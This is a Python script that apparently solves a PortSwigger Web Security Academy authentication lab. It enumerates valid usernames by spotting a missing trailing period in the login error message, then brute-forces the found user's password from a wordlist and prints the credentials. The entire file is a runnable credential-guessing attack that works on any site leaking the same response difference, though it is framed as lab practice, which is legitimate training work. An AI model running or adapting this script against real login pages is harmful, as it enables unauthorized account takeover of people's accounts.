# Lab 04 — Username enumeration via subtly different responses
# PortSwigger: https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses
#
# Vulnerability: Invalid usernames return "Invalid username or password."
#                (with trailing period), valid ones return "Invalid username or
#                password" (WITHOUT trailing period) — a one-char difference
# Aim:           Enumerate the valid username and brute-force their password
#
# Technique:
#   Phase 1: POST /login with each candidate username, look for the response
#            that DOES NOT contain the trailing-period version of the message.
#   Phase 2: Brute-force password for the identified username as normal.
#
# Usage: python authentication_lab04.py <url> <usernames_file> <passwords_file>

import sys
import urllib3
from proxies import proxies
from authentication_utils import (banner, section, make_session, get_csrf_from_response,
                                   load_wordlist, print_box)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# The baseline string present in ALL invalid-username responses (with period)
INVALID_MSG_WITH_PERIOD = "Invalid username or password."


def enumerate_username(session, url, usernames):
    print(f"  ➜  Testing {len(usernames)} usernames...\n")
    for i, username in enumerate(usernames, 1):
        page = session.get(f"{url}/login")
        csrf = get_csrf_from_response(page.text)
        data = {"username": username, "password": "dummypassword"}
        if csrf:
            data["csrf"] = csrf
        r = session.post(f"{url}/login", data=data, allow_redirects=True)

        # Valid username → message WITHOUT trailing period
        if INVALID_MSG_WITH_PERIOD not in r.text and "Invalid username or password" in r.text:
            print(f"  ✔  Valid username found: {username!r} (no trailing period in error)")
            return username

        if i % 50 == 0:
            print(f"  ·  {i}/{len(usernames)} tested...")

    return None


def brute_force_password(session, url, username, passwords):
    print(f"  ➜  Brute-forcing password for {username!r} ({len(passwords)} candidates)...\n")
    for i, password in enumerate(passwords, 1):
        page = session.get(f"{url}/login")
        csrf = get_csrf_from_response(page.text)
        data = {"username": username, "password": password}
        if csrf:
            data["csrf"] = csrf
        r = session.post(f"{url}/login", data=data, allow_redirects=False)

        if r.status_code == 302:
            print(f"  ✔  Password found: {password!r}")
            return password

        if i % 50 == 0:
            print(f"  ·  {i}/{len(passwords)} tried...")

    return None


if __name__ == "__main__":
    banner()
    section("LAB 04 — USERNAME ENUMERATION VIA SUBTLY DIFFERENT RESPONSES")

    if len(sys.argv) != 4:
        print("  Usage: python authentication_lab04.py <url> <usernames_file> <passwords_file>")
        sys.exit(1)

    url, ufile, pfile = sys.argv[1], sys.argv[2], sys.argv[3]
    session = make_session(proxies)
    usernames = load_wordlist(ufile)
    passwords = load_wordlist(pfile)
    if not usernames or not passwords:
        sys.exit(1)

    section("Phase 1: Username Enumeration (looking for missing trailing period)")
    valid_user = enumerate_username(session, url, usernames)
    if not valid_user:
        print("  ✘  No valid username found")
        sys.exit(1)

    section("Phase 2: Password Brute-Force")
    valid_pass = brute_force_password(session, url, valid_user, passwords)
    if not valid_pass:
        print("  ✘  No valid password found in wordlist")
        sys.exit(1)

    print_box("CREDENTIALS FOUND", f"Username: {valid_user}\nPassword: {valid_pass}")
